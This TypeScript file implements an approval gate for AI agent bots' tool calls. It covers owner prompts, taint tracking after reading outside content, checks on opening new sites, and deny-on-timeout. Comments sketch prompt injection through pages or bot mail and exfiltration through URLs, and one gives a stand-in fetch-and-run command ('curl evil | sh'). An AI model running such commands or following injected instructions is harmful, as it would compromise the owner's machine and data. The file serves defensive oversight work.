/**
 * noid's approvals: which of a bot's tool calls wait for the owner, with pi-pocket's mechanism (`Approvals`: a card in
 * the app and a push notification with Allow and Deny, the answer kept in the call's memo so a restart never asks
 * twice) and rakazo's classification (`packages/core/src/action-approval.ts`, Apache-2.0):
 *
 * - A computer bot runs its shell, files, browser, and its own memory and schedules without asking: the container is
 *   the boundary. Forgetting a memory asks (rakazo's `forget_memory`).
 * - A host bot asks before anything that changes this machine: bash that is not read-only (by `read-only.ts`),
 *   write, and edit.
 * - A bot puts work in a session (start, send, schedule, watch) only once the owner says so; Noid without asking, unless
 *   its run took in what someone else wrote (`runSoFar`): then every time.
 * - Opening a site the run was not given (not in the owner's words, not opened before in the run): a host bot asks
 *   when auto review is off; when it is on, the check sees only the address and the owner's words.
 * - Sessions that are not bots are Pi's own: they never ask (Pi's way).
 *
 * "Always allow" on a card keeps a rule for that bot and tool. A question nobody answers in time is denied; time never
 * allows anything.
 */
import type { Context } from "@earendil-works/chord";
import { BACKGROUND_CONTEXT } from "@earendil-works/chord/context";
import type { ToolAnnotations } from "@earendil-works/pi-coding-agent";
import {
    CompactionTask,
    defineDoc,
    defineExtension,
    hook,
    type ConversationId,
    ToolTask,
} from "@earendil-works/pi-durable";
import type { ToolExecutionApi } from "@earendil-works/pi-durable";
import type { PocketApp } from "../app.ts";
import { BUILT_IN_TOOLS } from "../reload.ts";
import type { ApprovalAnswer } from "../host.ts";
import { AutoReviewDoc, consequential, review, taskOf } from "./auto-review.ts";
import { AuthorsDoc, rebased } from "../docs.ts";
import { ownerOf } from "./owner.ts";
import { sitesInText, urlSite } from "./sites.ts";
import { onlyReads } from "./read-only.ts";
import type { BotProfile } from "./bots.ts";

/** The start of the id of every question noid asks, which only it may turn into an "always allow" rule. */
export const NOID_APPROVAL = "noid:";
/** The start of the id of a question auto review raised: never made into an "always allow" rule. */
export const AUTO_REVIEW_APPROVAL = `${NOID_APPROVAL}review:`;

/** Rules the owner made with "Always allow": a bot's calls of a tool that run without asking from then on. */
export const ApprovalRulesDoc = defineDoc<{
    rules: { bot: string; tool: string; at: number; by: string }[];
}>({
    kind: "x.noid.approval-rules",
    version: 1,
    ...rebased,
    scope: "session",
    initial: () => ({ rules: [] }),
});

export type Verdict =
    | { ask: false }
    /** `always`: asked every time, as `alwaysAsks`; "Always allow" never answers it for good. */
    | { ask: true; reason: string; subject: string; always?: true };

/**
 * Calls asked about every time: forgetting a memory, archiving a bot, changing another bot, making a bot on this
 * machine. "Always allow" never answers them for good (rakazo asks for these whatever the rules say).
 */
export function alwaysAsks(tool: string, args: Record<string, unknown> = {}): boolean {
    return (
        tool === "bot_archive" ||
        tool === "bot_update" ||
        (tool === "bot_create" && args.kind === "host") ||
        (tool === "memory" && args.action === "remove")
    );
}

/** Where a bot's conversation runs now: its folder decides, not the kind it was made as (a folder can move). */
export type Place = "host" | "computer";

/**
 * Tools a host bot uses without asking although they do not only read: they change the bot's own state, not this
 * machine (rakazo exempts remember, schedules, and subagents too). A subagent's own calls are checked as the bot's.
 */
const BOT_STATE_TOOLS = new Set([
    "memory",
    "schedule",
    "subagent",
    "goal",
    // Bot mail and Noid's overseer tools change bots, not this machine (bot_archive asks above).
    "bots",
    "bot_message",
    "bot_brief",
    "bot_create",
]);

/**
 * The session tools' calls that put work into a session: sessions run on this machine and never ask, so a bot's
 * would reach past the container (or past its own approvals) to the owner's files.
 */
export function startsWork(tool: string, args: Record<string, unknown>): boolean {
    return (
        tool === "session_start" ||
        tool === "session_send" ||
        (tool === "session_schedule" && args.action === "add") ||
        (tool === "repo_watch" && args.action === "add") ||
        (tool === "session_watch_pr" && args.action === "start")
    );
}

/** The session tools' calls that only look: a bot must read a session before it acts on it. */
function onlyLooks(tool: string, args: Record<string, unknown>): boolean {
    return (
        tool === "sessions" ||
        tool === "session_read" ||
        (["session_schedule", "repo_watch", "approvals"].includes(tool) &&
            args.action === "list") ||
        (tool === "session_watch_pr" && args.action === "status")
    );
}

/**
 * Whether a bot's call asks the owner first, by rakazo's classes. On this machine a bot asks before anything that is
 * not read-only, by `read-only.ts`'s list of what only looks (so a tool nobody listed asks); on the shared computer the
 * container is the boundary. Pure, so the rules are easy to read and test.
 */
export function classify(
    bot: BotProfile | undefined,
    place: Place,
    tool: string,
    args: Record<string, unknown>,
    readOnly = false,
    tainted = false,
): Verdict {
    if (bot === undefined) {
        return { ask: false };
    }

    if (tool === "memory" && args.action === "remove") {
        return {
            ask: true,
            reason: "forgets a memory",
            subject: `forget ${String(args.id ?? "")}`,
        };
    }

    // rakazo's archive_bot, and a bot changed by another bot (rakazo's propose_instructions_update): always asked,
    // wherever it runs, as either changes what a bot does from then on.
    if (tool === "bot_archive") {
        return {
            ask: true,
            reason: "archives a bot",
            subject: `archive ${String(args.name ?? "")}`,
        };
    }

    if (tool === "bot_update") {
        return {
            ask: true,
            reason: "changes another bot",
            subject: subjectOf("bot_update", {
                name: args.name,
                role: args.role,
                instructions: args.instructions,
            }),
        };
    }

    // Noid looks after the sessions for the owner: putting work in them is what it is for. Any other bot asks.
    if (startsWork(tool, args) && bot.main !== true) {
        return {
            ask: true,
            reason: "puts work in a session on your machine",
            subject: subjectOf(tool, args),
        };
    }

    // Noid too, once its run took in what someone else wrote (rakazo f49e35c0): a page or another bot's mail could have
    // asked for the work, and sessions run on this machine without asking. Every time: a rule cannot vouch for a page.
    if (startsWork(tool, args) && tainted) {
        return {
            ask: true,
            always: true,
            reason: "puts work in a session on your machine after reading what someone else wrote",
            subject: subjectOf(tool, args),
        };
    }

    if (onlyLooks(tool, args)) {
        return { ask: false };
    }

    // A bot on this machine reads it without asking: one made by a bot (on the computer, say, and talked into it by a
    // page) would reach past the container to the owner's files. The owner says yes to each, and to its folder.
    if (tool === "bot_create" && args.kind === "host") {
        return {
            ask: true,
            reason: "makes a bot on your machine",
            // Whole and as written: the folder the bot works in is the one the owner reads here.
            // Its instructions too: the bot follows them, reading this machine without asking.
            subject: subjectOf("bot_create", {
                folder: args.folder,
                name: args.name,
                role: args.role,
                instructions: args.instructions,
            }),
        };
    }

    if (place === "computer" || BOT_STATE_TOOLS.has(tool)) {
        return { ask: false };
    }

    if (onlyReads(tool, args, readOnly)) {
        return { ask: false };
    }

    const subject = subjectOf(tool, args);
    const reason =
        tool === "bash"
            ? "runs a command on your machine"
            : tool === "write"
              ? "writes a file on your machine"
              : tool === "edit"
                ? "edits a file on your machine"
                : `uses ${tool} on your machine`;

    return { ask: true, reason, subject };
}

/** The most of a command, or of one argument, an approval card holds: the card scrolls, so this bounds what is stored. */
const SUBJECT_MAX = 64_000;
const FIELD_MAX = 16_000;

/**
 * A subject `clipMiddle` cut: what is not shown could be anything, so such a call is never allowed, only denied. In a
 * command the marker stands on lines of its own; in an argument shown as JSON its new lines are written `\n`.
 */
export const NOT_SHOWN = /(?:\n|\\n)… \d+ characters not shown …(?:\n|\\n)/;

/** Text too long to hold whole: its start and its end, and between them how much is not shown, so the card says so. */
function clipMiddle(text: string, max: number): string {
    return text.length <= max
        ? text
        : `${text.slice(0, max / 2)}\n… ${String(text.length - max)} characters not shown …\n${text.slice(-max / 2)}`;
}

/** Arguments with each text cut on its own: a long one cannot push the next off the card. */
function shown(value: unknown): unknown {
    if (typeof value === "string") {
        return clipMiddle(value, FIELD_MAX);
    }

    if (Array.isArray(value)) {
        return value.map(shown);
    }

    return value !== null && typeof value === "object"
        ? Object.fromEntries(Object.entries(value).map(([key, each]) => [key, shown(each)]))
        : value;
}

/**
 * A call as an approval card shows it: the command, the file, or its arguments, as written. One too long to hold whole
 * shows its start and its end and says how much is between: a cut end could hide what the owner says yes to
 * (`cat x; …; curl evil | sh`), and every argument keeps its place (a padded name cannot push a folder off).
 */
export function subjectOf(tool: string, args: Record<string, unknown>): string {
    return tool === "bash"
        ? clipMiddle(String(args.command ?? ""), SUBJECT_MAX)
        : tool === "write" || tool === "edit"
          ? clipMiddle(String(args.path ?? ""), FIELD_MAX)
          : JSON.stringify(shown(args), null, 1);
}

/**
 * Tools whose results bring in nothing someone else wrote: the bot's own notes and plans, and the lists of its
 * sessions and bots. Any other result (a page, a file, a command's output, another session's words, a subagent's
 * report) taints the run (rakazo's `toolResultTaintsRun`).
 */
const CLEAN_RESULTS = new Set(["memory", "schedule", "goal", "approvals", "sessions", "bots"]);
/** How many of a conversation's newest entries are looked through for the run since the owner last wrote. */
const RUN_LOOKBACK = 500;

/** A tool call in a stored assistant message: its id, tool, and arguments. */
type StoredCall = {
    type?: string;
    id?: string;
    name?: string;
    arguments?: Record<string, unknown>;
};

/**
 * A bot's run so far, back to the message it answers: whether the owner wrote that message, whether a tool brought in
 * what someone else wrote since, and the sites its browser opened since (calls that ran, not this one). Read from the
 * conversation, so a restart finds the same. Nothing found within the lookback counts as not the owner's.
 */
export async function runSoFar(
    app: PocketApp,
    id: ConversationId,
    callId: string,
): Promise<{ byOwner: boolean; outside: boolean; opened: Set<string> }> {
    const ownerId = ownerOf(app)?.id;
    const written = (await app.harness.snapshot(AuthorsDoc, id, BACKGROUND_CONTEXT))?.entries ?? {};
    const conversation = await app.harness.conversation(id, BACKGROUND_CONTEXT);
    const page = await conversation?.entries({}, RUN_LOOKBACK, undefined, BACKGROUND_CONTEXT);
    const ran = new Set<string>();
    const opened = new Set<string>();
    let outside = false;

    // Newest first: a call's result comes before the message that made it.
    for (const entry of page?.items ?? []) {
        const message = entry.model?.[0] as
            | { toolName?: unknown; toolCallId?: unknown; isError?: unknown; content?: unknown }
            | undefined;

        if (entry.kind === "pi.user") {
            return {
                byOwner: ownerId !== undefined && written[String(entry.id)] === ownerId,
                outside,
                opened,
            };
        }

        if (entry.kind === "pi.tool-result") {
            outside ||= !CLEAN_RESULTS.has(String(message?.toolName ?? ""));

            if (message?.isError !== true) {
                ran.add(String(message?.toolCallId ?? ""));
            }
        }

        if (entry.kind === "pi.assistant" && Array.isArray(message?.content)) {
            for (const block of message.content as StoredCall[]) {
                const url = block.arguments?.url;

                if (
                    block.type === "toolCall" &&
                    block.name === "browser" &&
                    block.arguments?.action === "navigate" &&
                    typeof url === "string" &&
                    block.id !== callId &&
                    ran.has(String(block.id))
                ) {
                    const site = urlSite(url);

                    if (site !== undefined) {
                        opened.add(site);
                    }
                }
            }
        }
    }

    return { byOwner: false, outside: true, opened };
}

/** A browser call that opens a web address, and the site it goes to; undefined for any other call. */
function siteOpened(tool: string, args: Record<string, unknown>): string | undefined {
    return tool === "browser" && args.action === "navigate" && typeof args.url === "string"
        ? urlSite(args.url)
        : undefined;
}

/** How long a question waits before it is denied (NOID_APPROVAL_MINUTES, default an hour). */
function waitMs(): number {
    const minutes = Number(process.env.NOID_APPROVAL_MINUTES ?? 60);

    return (minutes > 0 ? minutes : 60) * 60_000;
}

/**
 * The hooks: always on, as approvals are a guard, not an option (pi-pocket's core-or-extension rule C1). A bot's
 * summaries are guarded here too, whether its session tools are on or off: written with what came from outside left
 * out (`noid-compact.ts`), never Pi Durable's, which reads it as it is.
 */
export function createApprovals(app: PocketApp) {
    return defineExtension({
        name: "noid-approvals",
        hooks: [
            hook(CompactionTask, {
                beforeCompact: (compaction, api, context) =>
                    app.noidCompaction.summarize(compaction, api, context),
            }),
            hook(ToolTask, {
                beforeTool: async (call, api, context: Context) => {
                    const bot = app.bots.of(api.conversationId);

                    if (bot === undefined) {
                        return undefined;
                    }

                    // A tool's own read-only mark counts; a built-in's can only come from a wrap.
                    const runtime = api as typeof api & Partial<Pick<ToolExecutionApi, "agent">>;
                    const declared = (await runtime.agent?.(context))?.tools.find(
                        (tool) => tool.name === call.name,
                    ) as { annotations?: ToolAnnotations } | undefined;
                    const args = call.arguments as Record<string, unknown>;
                    const readOnly =
                        !BUILT_IN_TOOLS.has(call.name) &&
                        declared?.annotations?.readOnlyHint === true;
                    const place = app.onHost(api.conversationId) ? "host" : "computer";
                    const site = siteOpened(call.name, args);
                    // The run so far, read only for the calls it decides: Noid putting work in a session, and a site.
                    const run =
                        (bot.main === true && startsWork(call.name, args)) || site !== undefined
                            ? await runSoFar(app, api.conversationId, call.id)
                            : undefined;
                    let verdict = classify(
                        bot,
                        place,
                        call.name,
                        args,
                        readOnly,
                        run !== undefined && (run.outside || !run.byOwner),
                    );
                    const reviewOn = (await api.snapshot(AutoReviewDoc, context))?.on === true;
                    // A site the run was not given: not named in what the bot was asked, and not opened before in this
                    // run. The page that links there could be asking for what the bot read to go along (rakazo f49e35c0).
                    const newSite =
                        site !== undefined &&
                        !run!.opened.has(site) &&
                        !sitesInText(await taskOf(app, api.conversationId)).has(site);

                    // On this machine, with no auto review to judge it, a bot asks before it opens such a site: it reads
                    // any file without asking, and the address could carry one out. On the computer it opens it (the
                    // container holds no file of the owner's); auto review, when on, checks it there too.
                    if (newSite && !verdict.ask && place === "host" && !reviewOn) {
                        verdict = {
                            ask: true,
                            always: true,
                            reason: "opens a site your task did not name",
                            subject: String(args.url),
                        };
                    }

                    // What this call was already found, or told, before a restart stands, whatever has changed since:
                    // a flagged call waiting for the owner runs only once the owner says so.
                    let answer = await api.memo<ApprovalAnswer>("noid.approval", context);
                    let reviewed = await api.memo<{ ask: boolean; reason: string }>(
                        "noid.review",
                        context,
                    );

                    if (answer === undefined && reviewed === undefined) {
                        const ruled = async () =>
                            ((await api.snapshot(ApprovalRulesDoc, context))?.rules ?? []).some(
                                (rule) => rule.bot === bot!.id && rule.tool === call.name,
                            );

                        if (verdict.ask) {
                            // "Always allow" answers a question for good, but those asked every time.
                            if (
                                verdict.always !== true &&
                                !alwaysAsks(call.name, args) &&
                                (await ruled())
                            ) {
                                return undefined;
                            }
                        } else {
                            // Auto review looks only at calls that would run without asking and change something;
                            // "always allow" wins over it too, but not for a new site: a rule for the browser came from
                            // some other call, never from this address. Checked once per call: a replay asks no model again.
                            if (
                                !consequential(call.name, args, readOnly) ||
                                !reviewOn ||
                                (!newSite && (await ruled()))
                            ) {
                                return undefined;
                            }

                            const signal = (api as typeof api & { signal?: AbortSignal }).signal;

                            reviewed = await api.memo(
                                "noid.review",
                                // A new site is judged by its address and the owner's words alone (rakazo 3d173c66).
                                await review(
                                    app,
                                    api.conversationId,
                                    bot,
                                    call.name,
                                    newSite ? { action: "navigate", url: args.url } : args,
                                    signal,
                                    newSite,
                                ),
                                context,
                            );
                        }
                    }

                    if (!verdict.ask && reviewed !== undefined) {
                        if (!reviewed.ask) {
                            return undefined;
                        }

                        verdict = {
                            ask: true,
                            reason: reviewed.reason,
                            subject: subjectOf(call.name, args),
                        };
                    }

                    if (!verdict.ask) {
                        return undefined;
                    }

                    if (answer === undefined) {
                        // Its own id (Lancet Guard's is the bare call): "always allow" only answers noid's own questions,
                        // and never one auto review raised (that would turn auto review off for the tool for good).
                        const id = `${reviewed?.ask === true ? AUTO_REVIEW_APPROVAL : NOID_APPROVAL}${api.taskId}:${call.id}`;
                        const timer = setTimeout(
                            () => app.approvals.answer(id, { allow: false, by: "nobody, in time" }),
                            waitMs(),
                        );

                        timer.unref();

                        try {
                            const asked = await app.approvals.request(
                                {
                                    id,
                                    conversationId: api.conversationId,
                                    taskId: api.taskId,
                                    callId: call.id,
                                    tool: call.name,
                                    subject: verdict.subject,
                                    reason: `${bot!.name} ${verdict.reason}`,
                                    createdAt: Date.now(),
                                },
                                context,
                            );

                            answer = await api.memo<ApprovalAnswer>(
                                "noid.approval",
                                asked,
                                context,
                            );
                        } finally {
                            clearTimeout(timer);
                        }
                    }

                    return answer.allow
                        ? undefined
                        : {
                              block: `${answer.by} denied this ${call.name} call (${verdict.reason}). Do not try to get around it; say what you wanted to do instead.`,
                          };
                },
            }),
        ],
    });
}
